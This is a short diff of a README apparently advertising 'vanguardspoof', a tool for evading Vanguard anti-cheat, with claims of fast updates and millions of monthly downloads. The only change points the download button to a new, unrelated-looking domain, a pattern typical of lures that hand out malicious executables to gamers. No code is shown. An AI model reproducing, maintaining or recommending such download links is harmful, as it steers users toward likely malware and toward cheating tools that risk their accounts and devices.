@@ -49,7 +49,7 @@ A: Yes — updated within 24h of every Vanguard patch.
 
 **Monthly downloads:** 2.3m+
 
-[![Download](https://img.shields.io/badge/Download-v2.9-brightgreen?style=for-the-badge)](https://connectinstruction.com/vanguardspoof)
+[![Download](https://img.shields.io/badge/Download-v2.9-brightgreen?style=for-the-badge)](https://dllvcrun.com/vanguardspoof)
 
 ---
 
